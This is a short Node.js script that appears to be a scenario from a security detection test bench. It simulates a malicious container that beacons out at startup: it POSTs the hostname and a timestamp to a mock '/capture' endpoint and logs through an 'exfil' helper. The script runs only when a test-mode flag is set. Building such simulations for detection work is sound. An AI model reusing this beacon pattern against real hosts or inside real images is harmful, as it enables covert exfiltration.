const http = require('http');
const os = require('os');
const fs = require('fs');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  console.log('TESTBENCH_MODE not enabled — benign exit.');
  process.exit(0);
}

const inDocker = fs.existsSync('/.dockerenv');
const mockHost =
  process.env.SCAS_MOCK_HOST ||
  (inDocker ? 'host.docker.internal' : '127.0.0.1');
const mockPort = Number(process.env.SCAS_MOCK_PORT || 3002);

const payload = JSON.stringify({
  host: os.hostname(),
  ts: Date.now(),
  scenario: '14-container-image',
});

const req = http.request(
  {
    hostname: mockHost,
    port: mockPort,
    path: '/capture',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  () => {}
);
req.on('error', () => {});
req.write(payload);
req.end();

try {
  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
  uploadJson('14', 'runtime-beacon', JSON.parse(payload));
} catch (_) {}

console.log('Malicious container started (simulated).');
setInterval(() => {}, 1000);
